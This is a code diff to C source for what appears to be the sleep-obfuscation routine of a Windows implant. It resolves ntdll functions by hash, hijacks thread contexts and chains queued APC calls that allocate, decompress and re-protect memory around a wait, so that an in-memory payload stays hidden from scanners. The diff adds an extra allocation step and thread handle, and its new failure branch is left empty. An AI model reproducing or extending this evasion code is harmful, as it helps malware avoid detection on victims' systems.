@@ -59,7 +59,7 @@ typedef struct
 static D_SEC( B ) DECLSPEC_NOINLINE NTSTATUS NTAPI ThreadCallbackFrameCaptureInternal( _In_ PTHREAD_PARAM Parameter )
 {
 	/* Set the frame pointer */
-	Parameter->Csp = C_PTR( U_PTR( __builtin_frame_address( 0 ) ) + sizeof( PVOID ) );
+	Parameter->Csp = C_PTR( U_PTR( _AddressOfReturnAddress() ) );
 
 	/* Execute ntdll!NtSignalAndWaitForSingleObject */
 	( ( __typeof__( NtSignalAndWaitForSingleObject ) * )( PeGetFuncEat(
@@ -361,7 +361,7 @@ static D_SEC( B ) DECLSPEC_NOINLINE NTSTATUS ThreadSetCallInternal( _Out_ PHANDL
 		Ctx->Rip = U_PTR( Function );
 
 		/* Read the return value */
-		Ret = *( ULONG_PTR * )( Ctx->Rsp );
+		Ret = C_PTR( *( ULONG_PTR * )( U_PTR( Ctx->Rsp ) ) );
 
 		/* Unset the return address */
 		*( ULONG_PTR * )( Ctx->Rsp ) = U_PTR( NULL );
@@ -416,7 +416,7 @@ static D_SEC( B ) DECLSPEC_NOINLINE NTSTATUS ThreadSetCallInternal( _Out_ PHANDL
 		Ctx->Eip = U_PTR( Function );
 
 		/* Read the return value */
-		Ret = *( ULONG_PTR * )( Ctx->Esp );
+		Ret = C_PTR( *( ULONG_PTR * )( Ctx->Esp ) );
 
 		/* Unset the return address */
 		*( ULONG_PTR * )( Ctx->Esp ) = U_PTR( NULL );
@@ -449,7 +449,7 @@ static D_SEC( B ) DECLSPEC_NOINLINE NTSTATUS ThreadSetCallInternal( _Out_ PHANDL
 		};
 
 		/* Queue an APC to block the call setup until this handle has been signaled */
-		Nst = Api.NtQueueApcThread( Thd, Api.NtWaitForSingleObject, BlockingHandle, FALSE, NULL );
+		Nst = Api.NtQueueApcThread( Thd, C_PTR( Api.NtWaitForSingleObject ), BlockingHandle, FALSE, NULL );
 
 		/* Failed to queue the APC */
 		if ( ! NT_SUCCESS( Nst ) ) {
@@ -528,6 +528,7 @@ D_SEC( B ) NTSTATUS NTAPI ObfNtWaitForSingleObject( _In_ HANDLE Handle, _In_ BOO
 	HANDLE				Th3 = NULL;
 	HANDLE				Th4 = NULL;
 	HANDLE				Th5 = NULL;
+	HANDLE				Th6 = NULL;
 	LPVOID				Mem = NULL;
 
 	DWORD				Cln = 0;
@@ -654,10 +655,30 @@ D_SEC( B ) NTSTATUS NTAPI ObfNtWaitForSingleObject( _In_ HANDLE Handle, _In_ BOO
 			break;
 		};
 
-		/* Call NtWaitForSingleOBject */
+		/* Call NtAllocateVirtualMemory */
 		Nst = ThreadSetCallInternal(
 				&Th2,
 				Th1,
+				Sfp,
+				Sfl,
+				PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtAllocateVirtualMemory" ) ),
+				6,
+				NtCurrentProcess(),
+				&Mem,
+				0,
+				&Len,
+				MEM_COMMIT,
+				PAGE_READWRITE
+		);
+
+		if ( ! NT_SUCCESS( Nst ) ) {
+			/* ABrot! */
+		};
+
+		/* Call NtWaitForSingleOBject */
+		Nst = ThreadSetCallInternal(
+				&Th3,
+				Th2,
 				Sfp,
 				Sfl,
 				PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtWaitForSingleObject" ) ),
@@ -675,8 +696,8 @@ D_SEC( B ) NTSTATUS NTAPI ObfNtWaitForSingleObject( _In_ HANDLE Handle, _In_ BOO
 
 		/* Call NtAllocateVirtualMemory */
 		Nst = ThreadSetCallInternal(
-				&Th3,
-				Th2,
+				&Th4,
+				Th3,
 				Sfp,
 				Sfl,
 				PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtAllocateVirtualMemory" ) ),
@@ -697,8 +718,8 @@ D_SEC( B ) NTSTATUS NTAPI ObfNtWaitForSingleObject( _In_ HANDLE Handle, _In_ BOO
 
 		/* Call RtlDecompressBufferEx */
 		Nst = ThreadSetCallInternal(
-				&Th4,
-				Th3,
+				&Th5,
+				Th4,
 				Sfp,
 				Sfl,
 				PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "RtlDecompressBufferEx" ) ),
@@ -720,8 +741,8 @@ D_SEC( B ) NTSTATUS NTAPI ObfNtWaitForSingleObject( _In_ HANDLE Handle, _In_ BOO
 
 		/* Call NtProtectVirtualMemory */
 		Nst = ThreadSetCallInternal(
-				&Th5,
-				Th4,
+				&Th6,
+				Th5,
 				Sfp,
 				Sfl,
 				PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtProtectVirtualMemory" ) ),
@@ -740,7 +761,7 @@ D_SEC( B ) NTSTATUS NTAPI ObfNtWaitForSingleObject( _In_ HANDLE Handle, _In_ BOO
 		};
 
 		/* Signal and wait for the last call to complete */
-		Nst = Api.NtSignalAndWaitForSingleObject( Evt, Th5, FALSE, NULL );
+		Nst = Api.NtSignalAndWaitForSingleObject( Evt, Th6, FALSE, NULL );
 
 		/* Failed to signal/and or wait on the thread */
 		if ( ! NT_SUCCESS( Nst ) ) {
@@ -748,7 +769,7 @@ D_SEC( B ) NTSTATUS NTAPI ObfNtWaitForSingleObject( _In_ HANDLE Handle, _In_ BOO
 		};
 
 		/* Query the exit status of the NtWaitForSingleObject call */
-		Nst = Api.NtQueryInformationThread( Th2, ThreadBasicInformation, &Tbi, sizeof( Tbi ), NULL );
+		Nst = Api.NtQueryInformationThread( Th3, ThreadBasicInformation, &Tbi, sizeof( Tbi ), NULL );
 
 		/* Failed to query its basic information */
 		if ( ! NT_SUCCESS( Nst ) ) {
@@ -759,6 +780,10 @@ D_SEC( B ) NTSTATUS NTAPI ObfNtWaitForSingleObject( _In_ HANDLE Handle, _In_ BOO
 		Nst = Tbi.ExitStatus;
 	} while ( 0 );
 
+	if ( Th6 != NULL ) {
+		Api.NtTerminateThread( Th6, STATUS_SUCCESS );
+		Api.NtClose( Th6 );
+	};
 	if ( Th5 != NULL ) {
 		Api.NtTerminateThread( Th5, STATUS_SUCCESS );
 		Api.NtClose( Th5 );
